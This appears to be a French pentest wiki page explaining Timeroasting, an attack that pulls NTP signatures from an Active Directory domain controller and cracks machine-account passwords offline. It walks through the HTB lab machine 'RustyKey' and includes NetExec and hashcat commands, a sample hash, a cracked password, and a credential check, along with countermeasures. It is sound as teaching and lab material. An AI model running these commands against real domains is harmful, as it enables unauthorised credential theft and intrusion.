# Timeroasting



## <mark style="color:red;">Timeroasting 🕐</mark>

#### <mark style="color:green;">Description</mark>

Attaque exploitant le protocole NTP (Network Time Protocol) dans Active Directory. Lorsqu'une requête NTP est envoyée, le hash NTLM du compte machine est utilisé comme clé dans l'algorithme d'intégrité (HMAC-SHA512 ou MD5-MD4-based MAC). Le MD5-MD4 n'est pas sécurisé et peut être brute-forcé.

#### <mark style="color:green;">Prérequis</mark>

* Aucune authentification requise
* Accès réseau au DC
* Comptes machine avec mots de passe faibles (rares sur systèmes modernes)

#### <mark style="color:green;">Commandes</mark>

```bash
# Avec NetExec (anciennement CrackMapExec)
nxc smb dc.domain.htb -M timeroast

# Sauvegarder les hashes
nxc smb dc.domain.htb -M timeroast > timeroast.hashes

# Cracker avec hashcat (v7.1.2+)
hashcat -m 31300 timeroast.hashes rockyou.txt --user
```

#### <mark style="color:green;">Format du hash</mark>

```
RID:$sntp-ms$[hash]$[data]
```

#### <mark style="color:green;">Indicateurs de vulnérabilité</mark>

* Mot de passe du compte machine changé manuellement (pas à la création)
* Ancien compte machine (standards de sécurité plus faibles)
* Password Last Set ≠ Created Date

#### Contre-mesures

* Utiliser des mots de passe longs et complexes pour les comptes machines
* Rotation régulière automatique des mots de passe machines (par défaut tous les 30 jours)

***

### <mark style="color:blue;">C'est quoi le Timeroasting ? 🕐</mark>

Le **Timeroasting** est une attaque qui exploite le protocole **NTP** (Network Time Protocol) pour récupérer et craquer les mots de passe des **comptes machines** dans Active Directory.

***

### <mark style="color:blue;">Analogie simple 🏢</mark>

Imagine un immeuble avec un système de sécurité :

#### <mark style="color:green;">Situation normale</mark>

```
Toi : "Quelle heure est-il ?"
Immeuble : "Il est 14h30"
```

👆 Information publique, pas de sécurité nécessaire

#### <mark style="color:green;">Le problème avec NTP dans AD</mark>

```
Toi : "Quelle heure est-il ?"
Immeuble : "Il est 14h30" + [signature secrète basée sur le mot de passe]
```

👆 La réponse contient une **signature cryptographique** pour prouver son authenticité

**Le problème** : Cette signature utilise le **mot de passe du compte machine** comme clé de chiffrement, et l'algorithme utilisé (MD5-MD4) est **faible** et peut être cracké !

***

### <mark style="color:blue;">Comment ça marche techniquement ? 🔍</mark>

#### <mark style="color:green;">1️⃣ Le protocole NTP dans Active Directory</mark>

Quand un ordinateur dans Active Directory demande l'heure au contrôleur de domaine (DC) :

```
Client ---[Requête NTP]---> DC
Client <--[Réponse NTP + MAC]--- DC
```

**MAC** = Message Authentication Code (signature d'intégrité)

#### <mark style="color:green;">2️⃣ Le MAC est calculé avec le hash NTLM du compte machine</mark>

```
MAC = HMAC(Clé, Message)
où Clé = Hash NTLM du mot de passe du compte machine
```

#### <mark style="color:green;">3️⃣ L'attaquant peut intercepter cette signature</mark>

```
┌─────────────────────────────────────────┐
│ Réponse NTP contient :                  │
│ - L'heure                               │
│ - Une signature basée sur le MDP machine│
└─────────────────────────────────────────┘
```

#### <mark style="color:green;">4️⃣ Brute-force offline de la signature</mark>

L'attaquant peut essayer des millions de mots de passe jusqu'à trouver celui qui génère la même signature.

***

### <mark style="color:blue;">Exemple concret avec RustyKey 🎯</mark>

#### Étape 1 : Envoyer des requêtes NTP pour tous les comptes machines

```bash
nxc smb dc.rustykey.htb -M timeroast
```

**Ce qui se passe** :

* NetExec envoie une requête NTP pour chaque RID (ID de compte machine)
* Le DC répond avec une signature pour chaque compte
* Ces signatures sont sauvegardées

#### Étape 2 : Résultat obtenu

```
TIMEROAST 10.10.11.75 1125:$sntp-ms$e29310adfef7175837324b2c7df35bd7$1c0111e900000000...
```

**Décomposition** :

* `1125` = RID du compte IT-COMPUTER3$
* `$sntp-ms$` = Format de hash Timeroasting
* `e29310...` = Hash qui contient le mot de passe chiffré

#### Étape 3 : Cracker avec hashcat

```bash
hashcat -m 31300 timeroast.hashes rockyou.txt --user
```

**Résultat** :

```
$sntp-ms$e29310adfef7175837324b2c7df35bd7$...:Rusty88!
```

👉 Le mot de passe du compte machine IT-COMPUTER3$ est **Rusty88!**

***

### <mark style="color:blue;">Pourquoi ça marche ? 🤔</mark>

#### 1️⃣ Mots de passe faibles sur les comptes machines

Normalement, les comptes machines ont des mots de passe **très longs et aléatoires** (128 caractères) générés automatiquement :

```
Mot de passe normal : Kj#8dL@mP9$xQ2wE....[120+ caractères]....
```

👆 **Impossible à cracker**

Mais parfois, un administrateur **définit manuellement** un mot de passe pour un compte machine :

```
Mot de passe manuel : Rusty88!
```

👆 **Facile à cracker !**

#### 2️⃣ Indice dans le writeup

Dans BloodHound, on voit que IT-COMPUTER3 a été créé le **31/12/2024 à 13:19**, mais son mot de passe a été changé **6.5 heures plus tard** :

```
Created:           31/12/2024 13:19
Password Last Set: 31/12/2024 19:45  ← Changé manuellement !
```

Les autres comptes ont leur mot de passe défini **à la création** (normal) :

```
Created:           31/12/2024 13:19
Password Last Set: 31/12/2024 13:19  ← Automatique
```

***

### <mark style="color:blue;">Schéma récapitulatif 🎨</mark>

```
┌──────────────────────────────────────────────────────────┐
│                    TIMEROASTING ATTACK                    │
└──────────────────────────────────────────────────────────┘

1. ATTAQUANT envoie requête NTP
   └─> "Quelle heure est-il ?" (pour le RID 1125)

2. DC répond avec signature
   └─> "14h30" + MAC(Hash_NTLM_IT-COMPUTER3$, "14h30")

3. ATTAQUANT extrait la signature
   └─> $sntp-ms$e29310adfef7175837324b2c7df35bd7$...

4. ATTAQUANT brute-force offline
   └─> Essaie : "Rusty88!" → Calcule MAC → Compare
   └─> ✅ MATCH ! Le mot de passe est "Rusty88!"

5. ATTAQUANT valide les credentials
   └─> nxc smb dc.rustykey.htb -u IT-COMPUTER3$ -p 'Rusty88!' -k
   └─> [+] rustykey.htb\IT-COMPUTER3$:Rusty88! ✅
```

***
